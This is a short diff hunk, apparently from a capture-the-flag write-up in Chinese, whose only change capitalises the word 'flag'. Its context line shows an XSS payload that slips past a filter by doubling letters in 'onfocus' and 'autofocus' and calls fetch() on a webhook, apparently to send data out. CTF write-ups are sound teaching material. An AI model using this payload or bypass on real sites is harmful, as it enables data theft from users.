@@ -50,4 +50,4 @@ pwned" oonnfofocuscus="fetch('http://localhost:9000/webhook/d91ab564/',{method:'
 autofofocuscus "whatever
 ```
 
-得到 flag。
+得到 FLAG。
